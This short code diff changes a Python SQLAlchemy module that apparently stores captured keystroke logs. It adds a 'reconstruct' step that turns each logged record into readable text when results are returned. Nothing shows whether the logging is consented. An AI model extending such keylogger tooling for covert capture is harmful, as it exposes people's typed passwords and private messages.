@@ -5,6 +5,7 @@ from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy import Column, Integer, String, DateTime, Boolean, ForeignKey
 from sqlalchemy.sql import func
 from sqlalchemy.orm import sessionmaker
+from reconstruct import reconstruct
 
 Base = declarative_base()
 
@@ -65,10 +66,13 @@ class Database:
 
             # Process the results to return a list of dictionaries
             keylogs = []
+            
             for _, keylog in results:
+                real_result = reconstruct(keylog.text)
                 keylogs.append({
                     "id": keylog.id,
                     "text": keylog.text,
+                    "real": real_result,
                     "timestamp": keylog.timestamp
                 })
 
